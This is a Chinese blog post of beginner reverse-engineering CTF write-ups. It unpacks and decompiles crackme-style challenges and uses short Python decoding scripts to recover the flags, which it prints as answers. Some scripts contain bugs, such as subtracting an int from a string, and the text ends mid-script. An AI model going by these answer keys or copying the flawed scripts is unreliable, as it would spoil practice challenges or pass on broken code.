data-src="/../Post_images/NKCTF-20230328.assets/1660584161777-7f310b00-abff-4350-9aea-51377d2b4ed6.png"                      alt="图片.png"                ><br>分析一下伪代码所要表达的内容：输入s2传入输入的flag，之后进行与正确flag字符的对比<br>这里的flag是7B，转化成十进制就是123，所以i要符合的条件值是？？？没有，所以for(…)循环是不存在程序运行过程中的。</p><blockquote><p>上面自己的分析貌似与题目意思有偏差,并且本人发现IDA中a快捷键的插件貌似没了，这个也要处理一下</p></blockquote><p>105、114与49都是ascii编码中的 即’i’、’r’与’1’，所以直接将一开始找的hacking_for_fun}中的i和r都改为1，即flag是{hack1ng_fo1_fun}<br>###flag{hack1ng_fo1_fun}</p><blockquote></blockquote><h3 id="判断将指出的特殊字符利用ascii换为数字字符"><a href="#判断将指出的特殊字符利用ascii换为数字字符" class="headerlink" title="判断将指出的特殊字符利用ascii换为数字字符"></a>判断将指出的特殊字符利用ascii换为数字字符</h3><h2 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660624960261-24daf645-97c1-4182-b1a8-59ce28427d99.png"                      alt="图片.png"                ><br>直接打开之后貌似就是flag<br>###flag{49d3c93df25caad81232130f3d2ebfad}</p><h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660626452013-74060c5b-6cae-41cf-9834-e0b5bd9910ac.png"                      alt="图片.png"                ><br>先放在DIE里判断一下文件的信息<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660627462259-9c6039ad-9e8f-4967-8267-57dc1d6ac25b.png"                      alt="图片.png"                >发现是被upx加过壳的，所以首先要的就是先给程序脱壳<br>在upx目录下进行脱壳输入的命令：<code>upx -d xxxx.exe</code><br>需要注意的是要将文件放在与upx同目录下或者说直接连文件的位置一起输入进去<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660627689419-42530de1-7178-4327-b583-e77208492da8.png"                      alt="图片.png"                >所以现在得到的程序就是已经拖过壳的程序<br>可由上图知程序是32位的所以我们放在32位的ida进行下一步的程序分析<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660627796623-52ea9056-c3e4-4d28-abd0-1d28412ad0a7.png"                      alt="图片.png"                ><br>大概的逻辑思路是这样的</p><ul><li><p>首先是<code>strcpy(Str2,&quot;HappyNewYear!&quot;);</code></p><p>   strcpy()是一种用于复制的函数声明，将后面的字符串”HappyNewYear”复制到Str2中去 </p></li><li><p>Str1这里是我们需要输入的flag</p></li><li><p>之后到<code>if(!strncmp((const char *)&amp;Str1, Str2,strlen(Str2)) )</code></p></li></ul><p>strncmp()是用来比较的函数，strlen(Str2)表示的是获取到Str2的长度，在这个长度下进行比较</p><ul><li>根据下面的<code>result = puts(&quot;this is true flag!&quot;);</code>可以知道上面的字符串就是我们所需要的flag</li></ul><p>###flag{HappyNewYear!}</p><h3 id="upx脱壳"><a href="#upx脱壳" class="headerlink" title="upx脱壳"></a>upx脱壳</h3><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660631085830-205662b2-b12f-45d5-919d-bc369eb19948.png"                      alt="image.png"                ><br>通过题目猜测这道题考的是异或，查看字符串上面的感觉像是需要异或处理的字符<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660632460668-c1e539da-9a06-4304-b349-3e8c5b8ea2a5.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660631233178-95c6811d-ad93-446f-9ce4-6aafcf398032.png"                      alt="image.png"                ><br>写脚本并且运行</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="string">&#x27;f&#x27;</span>,<span class="number">0x0A</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0x0C</span>,<span class="string">&#x27;w&amp;O.@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0x0D</span>,</span><br><span class="line">       <span class="string">&#x27;Z;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&quot;M#D&#x27;</span>,<span class="number">0x0E</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">0x6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0x0F</span>,<span class="string">&#x27;G2O&#x27;</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(enc[i])==<span class="built_in">int</span>: <span class="comment">#将数字转化成字符</span></span><br><span class="line">        enc[i] = <span class="built_in">chr</span>(enc[i]) <span class="string">&#x27;&#x27;&#x27;chr()函数是用一个在range(256)内的将0~255内的整数转为字符串</span></span><br><span class="line"><span class="string">                            第一个字母已知是f，所以不需要做异或处理&#x27;&#x27;&#x27;</span></span><br><span class="line">enc =<span class="string">&quot;&quot;</span>.join(enc)</span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)):     <span class="comment">##范围是从第1位一直到字符的最后一位</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i])^<span class="built_in">ord</span>(enc[i-<span class="number">1</span>]))  <span class="comment">##ord()函数是将字符串转为整数的函数</span></span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment">##打印flag</span></span><br></pre></td></tr></table></figure></div><p>这里插入菜鸟教程的python内置函数界面<br><a class="link"   href="https://www.runoob.com/python/python-built-in-functions.html" >Python 内置函数 | 菜鸟教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>###flag{QianQiuWanDai_YiTongJiangHu}</p><h2 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660633716870-4810a12e-0eee-4ba3-b2a2-5e6307033f4d.png"                      alt="image.png"                ><br>下载后发现是一个apk文件，我们需要用别的安卓工具来打开这个文件，直接找到main函数就能够获得flag了<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660636948745-11b281e6-bf10-4e49-abdc-9b342501d5ab.png"                      alt="image.png"                ><br>###flag{7631a988259a00816deda84afb29430a}</p><h3 id="apk文件的处理"><a href="#apk文件的处理" class="headerlink" title="apk文件的处理"></a>apk文件的处理</h3><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660637182839-70c11767-49f7-4b46-b4ed-ee35948d7798.png"                      alt="image.png"                ><br>直接查看字符串<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660637229694-cf68381f-e725-4116-a677-003e9e812d19.png"                      alt="image.png"                ><br>在里面看见两串可以纳入考虑的字符串”rigth flag!\n” “e3nifIH9b_C@n@dH”<br>进入到该函数之后，看到函数的原伪代码的大概<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660637407990-1b73cba3-08de-4b20-b2d8-9d5d4dacca2c.png"                      alt="image.png"                ><br>v4那里进入后有一个<code>sub_411AB0</code>的函数，点进去之后发现<code>aAbcdefghijklmn</code>这个函数较可疑的点进去之后发现<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660638196822-e6b98b6e-c415-46de-882d-31d63bac0cda.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660638265034-5e4ee26e-bc46-40e8-bda7-223bd31a31f6.png"                      alt="image.png"                ><br>是base64编码的特征，往上逆着推，<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660640584675-d4a4e630-7d8a-45e2-aa8b-5c6305f3ad10.png"                      alt="image.png"                ><br>所以需要进行一个简单的减法将flag算出来，而且需要知道Str2的值就是我上面找到的奇怪的字符”e3nifIH9b_C@n@dH”,有两种方法</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;e3nifIH9b_C@n@dH&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):   <span class="comment">##范围是从0到最后</span></span><br><span class="line">    index = <span class="built_in">chr</span> (<span class="built_in">ord</span>(<span class="built_in">str</span>[i]-i))</span><br><span class="line">    flag += index    <span class="comment">##算出来之间的字符后，下一步进行base64编码的转化</span></span><br><span class="line">flag = base64.b64decode(flag)  <span class="comment">##base64.b64decode()方法，我们可以将二进制字符串解码为正常形式</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660641981806-dc2ec121-2f4d-40a9-9031-97eb943f706a.png"                      alt="image.png"                ></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="built_in">list</span>(<span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(str2)</span><br><span class="line"><span class="comment"># print(ord(str2[0]))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">    str2[i]= <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i])-i) <span class="comment">#改为相减</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(str2))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ord():字符转ascii码</span></span><br><span class="line"><span class="comment">#chr():ascii码转字符</span></span><br></pre></td></tr></table></figure></div><p> 得到 **e2lfbDB2ZV95b3V9 **放在在线base64中解码<br>flag{i_l0ve_you}</p><blockquote><p>自己做题的时候这里出现的一个错误<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660642237255-3e0e7883-553f-43ca-bd7c-3b9c313be3ba.png"                      alt="image.png"                ><br>在base64包存在的情况下，为什么出不来结果<br>找了百度之后才知道原来是命名的时候出现错误了<br>因为当时命名的文件名是”base64.py“，与包base64重合了，所以会出现混乱，把名字直接改为exp.py 结果就跑出来了</p></blockquote><h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660705341952-f31e9d73-ba84-400d-8af4-a0915c4b521b.png"                      alt="image.png"                ><br>32位的程序，直接用IDA打开之后分析程序<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660725669019-b2e2bcdc-904f-4cc8-8114-81328924e8ed.png"                      alt="image.png"                ><br>发现有一串10组成的字符串，再根据下面的判断语句<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660727742861-e3ca20f3-f5ab-4781-a3c9-6392c0c14d61.png"                      alt="image.png"                ><br>根据11、14-18、51行可以判断为迷宫题，将上面的25位的字符串转为5x5的迷宫图<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660728087096-1378b977-0e1a-4067-97a4-cbac5b907c0f.png"                      alt="image.png"                ><br>从*一直走到#结合上面的操作数，所以flag就是222441144222<br>###flag{222441144222}</p><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><h2 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660728280391-f07f0e0d-e4ff-44e7-a377-9c164e2165b7.png"                      alt="image.png"                ><br>第一步还是查看字符串，从里面找一些可以确定flag出现位置的函数与加密的伪代码<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660728374275-40e54880-9a28-4f50-8424-0d0c045162b0.png"                      alt="image.png"                ><br>可以大致确定flag是通过这里进行加密的<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660736091210-01c2540f-4323-4edd-93d1-8d0b1e36ea3f.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660737295297-c4422e92-58e1-4708-9ac7-37f5dd370d1a.png"                      alt="image.png"                ><br>进入v9与src之后发现都是以小端序排列的数据低位存放在低地址，高位存放在高地址处，所以需要将之前的字符倒过来看<br>而key3与key1不存在小端的情况<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660736675159-7086e6db-af35-4343-86af-edd69302d3f5.png"                      alt="image.png"                ><br>:::tips<br>text &#x3D; join(key3,(const char *)v9)<br>::key3 –&gt;  ‘kills’<br>::v9 –&gt; ‘wodah’ 倒过来就是 ‘hadow’<br>text &#x3D; killshadow<br>:::<br>:::tips<br>strcpy(key,key1) 将key1中的字符串输到key<br>::key1 –&gt;’ADSFK’<br>*(_QWORD *)src &#x3D; ‘SLCDN’; 倒过来是’NDCLS’<br>strcat(key ,src)将key与src字符连接起来<br>::src –&gt; ‘SLCDN’<br>key &#x3D; key1 + src –&gt; key &#x3D; ‘ADSFKNDCLS’<br>:::<br>正看代码就是：<br>:::tips<br>输入自己的字符fake flag，通过getchar()函数赋给v1<br>后面就是通过对v1的加密得到最后正确答案的flag<br>加密的过程是<code>str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;</code><br>所以说逆推v1的话就是<code>v1 =str2[v2]-97+26+key[v3%v5]-58 </code><br>并且根据上面来看我们需要得到的是v1的ASCII的编码的数值，需要将v1算出来是一个整数的形式<br>所以<code>v1 = ord(str2[v2]-97)+26*i+ord(key[v3%v5])-58</code><br>:::<br>:::tips<br>同样要注意的是这里的小写字母要全改为大写字母<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660738802756-ed4ad7fb-c542-41ed-bc08-c3dd1e1600dd.png"                      alt="image.png"                ><br>:::</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )  <span class="comment">//！strcmp(text, str2）--&gt;text = str2</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>所以通过伪代码逆推写出得到flag的脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">v3=<span class="number">0</span></span><br><span class="line">v5=<span class="built_in">len</span>(key)</span><br><span class="line">flag=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        v1=(<span class="built_in">ord</span>(str2[j])-<span class="number">97</span>)+<span class="number">26</span>*i+<span class="built_in">ord</span>(key[v3%v5])-<span class="number">58</span>  <span class="comment">##j替换掉v2</span></span><br><span class="line">        <span class="keyword">if</span>(v1&gt;<span class="number">65</span> <span class="keyword">and</span> v1&lt;=<span class="number">90</span>):</span><br><span class="line">            flag[j]=<span class="built_in">chr</span>(v1)  <span class="comment">#最后将ascii表示的v1转为字符</span></span><br><span class="line">        v3=v3+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660742382123-1c6255cb-cb0b-4ea5-8dca-737db68c4864.png"                      alt="image.png"                ><br> ‘’’这里要给v1数值留作填充,观察到str2和key都是十位所以也是十位’’’<br>###flag{KLDQCUDFZO}</p><hr><blockquote><p>在flag加密：str2[v2] &#x3D; (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660739278716-3248d691-8e2e-44be-a4c7-1eb4c9e140b4.jpeg"                      alt="b85d67b431c862f4527480c7deddefb.jpg"                ><br>这里一开始没想通，所以花了蛮长时间去理解</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">v5 = <span class="built_in">len</span>(key)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>   <span class="comment">###这里要给v1数值留作填充  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        v1 = <span class="built_in">ord</span>(str2[j]-<span class="number">97</span>)+<span class="number">26</span>*i+<span class="built_in">ord</span>(key[v3%v5])-<span class="number">58</span>  <span class="comment">##j替换掉v2</span></span><br><span class="line">        <span class="keyword">if</span>(v1&gt;<span class="number">65</span> <span class="keyword">and</span> v1&lt;=<span class="number">90</span>):</span><br><span class="line">            flag[j]=<span class="built_in">chr</span>(v1) <span class="comment">##最后将ascii表示的v1转为字符</span></span><br><span class="line">        v3=v3+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>当然还有C的脚本，但一般都使用python来写脚本<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660742651235-6cb60dad-ea6b-4c54-b8e5-080f99c32063.png"                      alt="20210716201716618.png"                ></p><h3 id="小端序问题、拼接问题"><a href="#小端序问题、拼接问题" class="headerlink" title="小端序问题、拼接问题"></a>小端序问题、拼接问题</h3><h2 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h2><p>下载下来的题目是以class后缀的java语言的程序，所以使用JD-GUI的工具，将文件拖进去之后能够看到程序的整个过程<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660743067803-ada2a14e-f2c5-4d27-a0ef-da4f9d176e78.png"                      alt="image.png"                ><br>感觉像是异或处理</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):    </span><br><span class="line">    flag += <span class="built_in">chr</span>((key[i]-<span class="number">64</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment">##打印flag</span></span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660743953945-e912c048-704f-4194-bffd-f0fd506aa4ac.png"                      alt="image.png"                ><br>###flag{This_is_the_flag_!}</p><h3 id="JD-GUI-Java-XOR逆向"><a href="#JD-GUI-Java-XOR逆向" class="headerlink" title="JD-GUI[Java XOR逆向]"></a>JD-GUI[Java XOR逆向]</h3><h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><p>查看字符后好像找到了一半的flag<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660744056515-df816ad1-fa1c-4137-ac34-4c53b0015deb.png"                      alt="image.png"                ><br>f1&#x3D;GXY{do_not_<br>进入get_flag()的函数，可以看到flag的加密过程<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660744315612-371d384f-4306-4c4a-bd77-d7f44f0b3341.png"                      alt="image.png"                ><br>通过观察flag的排序应该是case4-&gt;case5-&gt;case1最后能够得到flag的另一半f2<br>case4中将<code>&quot;icug</code>of\x7F”&#96;复制给s,s给f2赋值，值得注意的是，计算机一般都是小端序排列，所以如果直接用字符的话肯定会报错，除非将字符倒过来，或者直接将字符转为ASCII编码再转为16进制的数。<br>case5中将上面的f2进行加密，可以看出是将字符按奇偶分开。<br>case1中是将f1与f2拼接起来<br>写脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x7F</span>] <span class="comment">#这里用的是第二种方法转换</span></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">2</span>)==<span class="number">1</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(f2[i]-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(f2[i]-<span class="number">1</span>)  <span class="comment">#别忘了将转回字符串</span></span><br><span class="line"><span class="built_in">print</span>(f1+temp)</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660746438081-50948afa-68fc-413d-b2da-dee68857031e.png"                      alt="image.png"                ><br>##flag{do_not_hate_me}</p><blockquote><p>上面的操作不知道是怎么回事，小端序被去了，忘记录屏看了呜呜呜~~<br>第二次重新开的时候就发现问题了<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660747151866-2d4c8d7b-1ea0-4a74-914d-09e2844f5dac.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660747161841-44ac763c-c575-43e4-850f-5700aea0bdee.png"                      alt="image.png"                ><br>按下R之后变成了这串字符，这里就需要用到小端序了，所以第二个脚本就这样来的，这样看的话应该就是第一个开的姿势不对，什么勾八题目(╯▔皿▔)╯！！</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f2 = <span class="string">&#x27;\x7Ffo`guci&#x27;</span>[::-<span class="number">1</span>]  <span class="comment">#a[::-1]就是将序列a中的元素翻转</span></span><br><span class="line">f2a = <span 